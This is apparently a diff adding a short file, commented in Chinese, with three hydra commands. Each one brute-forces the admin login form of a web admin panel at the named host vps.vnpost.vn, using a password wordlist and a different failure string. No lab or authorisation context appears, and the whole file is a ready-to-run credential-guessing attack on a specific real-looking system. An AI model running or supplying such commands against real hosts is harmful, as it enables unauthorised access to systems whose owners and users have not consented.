@@ -1,0 +1,16 @@
+# 正确的hydra命令（使用失败特征反选）
+
+# 方法1：使用title作为失败特征
+hydra -l admin -P wordlist.txt -s 443 -t 5 \
+  vps.vnpost.vn \
+  https-post-form "/cgi-bin/MANGA/index.cgi:func=login&username=^USER^&password=^PASS^:F=Web Admin"
+
+# 方法2：使用login_box作为失败特征  
+hydra -l admin -P wordlist.txt -s 443 -t 5 \
+  vps.vnpost.vn \
+  https-post-form "/cgi-bin/MANGA/index.cgi:func=login&username=^USER^&password=^PASS^:F=login_box"
+
+# 方法3：使用login按钮作为失败特征
+hydra -l admin -P wordlist.txt -s 443 -t 5 \
+  vps.vnpost.vn \
+  https-post-form "/cgi-bin/MANGA/index.cgi:func=login&username=^USER^&password=^PASS^:F=submit_action"
